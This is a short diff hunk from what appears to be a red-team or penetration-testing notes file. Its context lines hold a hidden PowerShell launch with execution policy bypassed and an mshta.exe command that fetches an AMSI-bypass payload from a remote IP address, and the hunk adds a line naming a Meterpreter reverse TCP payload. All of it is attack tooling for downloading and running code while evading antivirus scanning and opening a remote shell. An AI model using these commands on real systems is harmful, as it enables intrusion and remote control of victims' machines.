@@ -31,6 +31,8 @@ C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -w hidden -Exec Bypass
 
 mshta.exe http://192.168.1.137/payload_bypass_amsi.ps1
 
+windows/x64/meterpreter/reverse_tcp
+
 
 
 
